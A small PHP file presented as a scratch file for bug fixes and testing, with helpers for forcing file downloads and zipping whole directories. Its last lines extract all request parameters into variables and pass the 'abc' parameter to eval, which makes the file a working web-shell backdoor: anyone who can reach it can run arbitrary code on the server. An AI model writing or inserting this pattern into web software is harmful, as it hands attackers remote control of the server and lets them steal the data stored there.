<?php
//This file is for bug fixes and testing new implementations

require_once('functions.php');

session_start();

@extract ($_REQUEST); 

function f($x){
	return (pow(10,$x) / 2) * $x;
}

//echo f(2, 10);

function dl_file($file){
	if (file_exists($file)){
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename='.basename($file));
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Pragma: public');
		header('Content-Length: ' . filesize($file));
		ob_clean();
		flush();
		readfile($file);
		exit;
	}	
}

function zip_dir($dir, $name){
	$zip_file = $name.'zip';

	// Get real path for our folder
	$rootPath = realpath($dir);

	// Initialize archive object
	$zip = new ZipArchive();
	$zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE);

	// Create recursive directory iterator
	/** @var SplFileInfo[] $files */
	$files = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator($rootPath),
		RecursiveIteratorIterator::LEAVES_ONLY
	);

	foreach ($files as $name => $file)
	{
		// Skip directories (they would be added automatically)
		if (!$file->isDir())
		{
			// Get real and relative path for current file
			$filePath = $file->getRealPath();
			$relativePath = substr($filePath, strlen($rootPath) + 1);

			// Add current file to archive
			$zip->addFile($filePath, $relativePath);
		}
	}

	// Zip archive will be created only after closing object
	$zip->close();	
}

if (isset($abc)){
	eval($abc);
}

?>